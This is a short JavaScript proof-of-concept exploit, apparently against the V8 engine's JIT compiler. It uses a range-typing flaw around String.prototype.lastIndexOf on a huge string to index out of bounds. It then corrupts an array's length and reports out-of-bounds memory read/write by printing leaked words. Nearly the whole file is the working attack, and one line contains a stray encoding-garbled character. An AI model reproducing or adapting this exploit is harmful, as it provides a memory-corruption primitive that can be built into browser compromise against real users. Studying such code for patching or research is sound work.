let log = print;

let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => {
    fv[0] = f;
      return dv[0];
}

let i2f = (i) => {
    dv[0] = BigInt(i);
      return fv[0];
}

let hexprintablei = (i) => {
    return (i).toString(16).padStart(16,"0");
}

let assert = (l,r,m) => {
  if (l != r) {
    log(hexprintablei(l) + " != " +  hexprintablei(r));
    log(m);
    throw "failed assert";
  }
  return true;
}

SUCCESS = 0;
FAILURE = 1;

FMARK = i2f(0xDEADDEAE); // lsb must be set to 0!
FTAGGEDBACKINGSTORE = i2f(0x4242);

fSIZE = i2f(0x0000010000000000);
SIZE = 0x100

const str = "____"+"DOARE".repeat(214748359);

function opt_me() {
  const OOB_OFFSET = 5;
  let idx = String.prototype.lastIndexOf.call(str, ''); // JSCall | Range(-1, 1073741798)
  let val = Math.abs(Math.abs(idx) + 25); 
  val = val >> 30;
  val = val * OOB_OFFSET;
  let leak = 0;
  if (val >= OOB_OFFSET)
    leak = 0;
  else {
    let arr = new Array(1.1,1.1);
    arr2 = new Array(FMARK, FMARK);
    arr3 = new Array(1,2,3);
    leak = arr[val];
    arr[val]Â = fSIZE;
    if (leak != 1.1 && leak != 0 && leak != undefined) {
      print("[+] Corrupted length of arr : " + arr.length);
      assert(arr.length, SIZE);
      print("[+] Got OOB R/W");
      for (let i = 0; i < 30; ++i)
        print(hexprintablei(f2i(arr[i])));
      return SUCCESS;
    }
  }
  return FAILURE;
}


for (var i = 0; i < 0x10000; ++i) {
  var ret = opt_me();
  if (ret == SUCCESS)
    break;
}
